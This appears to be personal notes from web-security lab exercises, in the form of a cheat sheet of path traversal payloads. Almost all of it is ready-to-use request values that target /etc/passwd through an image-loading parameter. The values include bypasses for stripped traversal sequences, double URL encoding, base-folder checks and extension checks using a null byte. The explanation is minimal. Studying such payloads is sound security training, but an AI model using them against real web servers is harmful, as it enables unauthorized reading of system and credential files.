### Path Traversal

**Simple Case "No defense mechanism" :**

in this case we intercept the request and change the location of requested resource 

`<img src="/loadImage?filename=218.png">`

`<img src="/loadImage?filename=../../../etc/passwd">`



**Use absolute pass directly**

`<img src="/loadImage?filename=/etc/passwd">`



**Use nested traversal sequences**

`....//`

`....\/`

`<img src="/loadImage?filename=....//....//....//etc/passwd">`



**Encode "/" twice**

..%25%32%66..%25%32%66..%25%32%66

`<img src="/loadImage?filename=..%25%32%66..%25%32%66..%25%32%66etc/passwd">`

*File path traversal, traversal sequences stripped with superfluous URL-decode*



**Base folder check**

`<img src="/loadImage?filename=/var/www/images/../../../etc/passwd">`



**Validate file extension**

`<img src="/loadImage?filename=/var/www/images/../../../etc/passwd%00.jpg">`

*don't forget dot (.) before extention*



























